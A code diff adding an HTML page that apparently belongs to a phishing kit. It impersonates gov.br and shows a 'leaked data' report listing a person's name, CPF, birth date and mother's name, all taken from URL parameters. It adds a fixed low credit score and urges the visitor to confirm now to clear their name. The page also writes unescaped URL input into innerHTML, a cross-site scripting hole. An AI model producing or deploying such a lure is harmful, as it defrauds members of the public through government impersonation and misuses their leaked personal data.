@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demonstrativo de dados vazados</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="images/AruTTdpf3pY6.png" alt="gov.br" class="logo">
+        </div>
+        <div class="alert">Revise seus dados abaixo e confirme agora para limpar seu nome e recuperar seu acesso ao crédito no mercado.</div>
+        <div id="info-container" class="info-container"></div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const infoList = [
+            { key: "name", label: "Nome completo" },
+            { key: "cpf", label: "CPF" },
+            { key: "dateOfBirth", label: "Data de nascimento" },
+            { key: "motherName", label: "Nome da mãe" }
+        ];
+
+        const infoContainer = document.getElementById('info-container');
+        let showAny = false;
+
+        infoList.forEach(item => {
+            const value = params.get(item.key);
+            if (value) {
+                showAny = true;
+                const box = document.createElement('div');
+                box.className = 'info-box';
+                box.innerHTML = `<div class="info-label">${item.label}:</div>
+                                 <div class="info-value">${value}</div>`;
+                infoContainer.appendChild(box);
+            }
+        });
+
+        // Sempre mostra o score (se vier no parâmetro usa ele, se não, mostra fixo)
+        const scoreValue = params.get('score') || '129 Pontos - Baixo';
+        const scoreBox = document.createElement('div');
+        scoreBox.className = 'info-box';
+        scoreBox.innerHTML = `<div class="info-label">Score:</div>
+                              <div class="info-value">${scoreValue}</div>`;
+        infoContainer.appendChild(scoreBox);
+
+        // Se não mostrar nada dos outros campos, só score, tira o alerta
+        if (!showAny) {
+            document.querySelector('.alert').style.display = "none";
+        }
+    </script>
+</body>
+</html>
